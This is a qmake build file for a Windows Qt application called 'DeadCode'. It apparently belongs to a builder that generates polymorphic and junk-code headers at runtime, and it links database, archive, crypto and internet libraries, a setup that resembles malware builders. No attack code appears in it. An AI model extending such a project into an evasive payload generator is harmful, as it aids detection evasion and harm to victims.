# Основные модули Qt, которые используются в проекте
QT       += core gui network widgets

# Имя целевого исполняемого файла
TARGET = DeadCode
# Тип проекта — приложение
TEMPLATE = app

# Исходные файлы (.cpp)
SOURCES += $$PWD/../src/main.cpp \
           $$PWD/mainwindow.cpp

# Заголовочные файлы (.h)
HEADERS += $$PWD/mainwindow.h \
           $$PWD/../src/build_key.h \
           $$PWD/../src/polymorphic_code.h \
           $$PWD/../src/junk_code.h

# Файлы интерфейса (.ui)
FORMS   += $$PWD/mainwindow.ui

# Файл ресурсов для иконки (временно закомментирован для отладки)
# RC_FILE = $$PWD/../icon.rc
# !exists($$RC_FILE) {
#     error("Resource file icon.rc not found at $$RC_FILE")
# }

# Пути для поиска заголовочных файлов
INCLUDEPATH += $$PWD/../src \
               $$PWD \
               $$[QT_INSTALL_HEADERS] \
               $$[QT_INSTALL_HEADERS]/QtWidgets \
               $$[QT_INSTALL_HEADERS]/QtGui \
               $$[QT_INSTALL_HEADERS]/QtNetwork \
               $$[QT_INSTALL_HEADERS]/QtCore

# Настройка путей для библиотек (используем vcpkg)
VCPKG_INSTALL_DIR = $$(VCPKG_INSTALL_DIR)
isEmpty(VCPKG_INSTALL_DIR) {
    VCPKG_INSTALL_DIR = C:/vcpkg/installed/x64-windows-static
    message("VCPKG_INSTALL_DIR not set, using default: $$VCPKG_INSTALL_DIR")
}
INCLUDEPATH += $$VCPKG_INSTALL_DIR/include
LIBS += -L$$VCPKG_INSTALL_DIR/lib \
        -lsqlite3 \
        -lzip \
        -lz \
        -lbz2 \
        -llibssl \
        -llibcrypto \
        -lbcrypt \
        -lws2_32 \
        -lwininet \
        -lgdiplus \
        -liphlpapi \
        -lcrypt32 \
        -lurlmon \
        -lole32 \
        -lshell32

# Флаги компиляции
QMAKE_CXXFLAGS += -O2 \
                  -std=gnu++17 \
                  -Wall \
                  -Wextra \
                  -Werror=return-type \
                  -fexceptions \
                  -DUNICODE \
                  -D_UNICODE \
                  -DWIN32 \
                  -DQT_NO_DEBUG

# Флаги линковки
QMAKE_LFLAGS += -DYNAMICBASE \
                -NXCOMPAT \
                -SUBSYSTEM:WINDOWS

# Определения для сборки (добавляем дату сборки и версию из git)
DEFINES += BUILD_DATE=\\\"$$system(date /t)\\\" \
           BUILD_VERSION=\\\"$$system(git rev-parse --short HEAD 2> nul || echo unknown)\\\"

# Директории для выходных файлов
DESTDIR = $$PWD/../build
OBJECTS_DIR = $$PWD/release
MOC_DIR = $$PWD/release
UI_DIR = $$PWD/release

# Очистка (удаляем исполняемый файл при очистке проекта)
QMAKE_CLEAN += $$DESTDIR/DeadCode.exe

# Дополнительные проверки и зависимости для Windows
win32 {
    CONFIG(debug, debug|release) {
        # Для отладочной сборки
        QMAKE_CXXFLAGS += -g
        LIBS += -lgdi32
    } else {
        # Для релизной сборки
        QMAKE_LFLAGS += -static
    }
}

# Пользовательские шаги сборки для генерации заголовков
PRE_TARGETDEPS += $$PWD/../src/build_key.h \
                  $$PWD/../src/polymorphic_code.h \
                  $$PWD/../src/junk_code.h

QMAKE_EXTRA_TARGETS += gen_headers
gen_headers.commands = @echo "Headers are generated during runtime by mainwindow.cpp"
# Создание пустых файлов, если они отсутствуют
!exists($$PWD/../src/build_key.h) {
    system(echo. > $$PWD/../src/build_key.h)
}
!exists($$PWD/../src/polymorphic_code.h) {
    system(echo. > $$PWD/../src/polymorphic_code.h)
}
!exists($$PWD/../src/junk_code.h) {
    system(echo. > $$PWD/../src/junk_code.h)
}